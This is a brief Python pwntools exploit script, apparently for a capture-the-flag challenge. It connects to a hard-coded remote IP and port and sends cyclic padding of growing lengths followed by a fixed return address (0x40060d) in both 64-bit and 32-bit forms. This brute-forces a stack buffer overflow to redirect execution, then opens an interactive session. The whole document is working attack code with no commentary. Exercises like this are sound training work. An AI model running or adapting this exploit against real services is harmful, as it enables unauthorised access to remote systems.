from pwn import *
context(os='linux')

for i in range(20):
	io = remote('111.200.241.244', 51115)
	io.recvuntil(b'>')
	io.send(cyclic(8 * i) + p64(0x40060d))
	io.interactive()
for i in range(20):
	io = remote('111.200.241.244', 51115)
	io.recvuntil(b'>')
	io.send(cyclic(4 * i) + p32(0x40060d))
	io.interactive()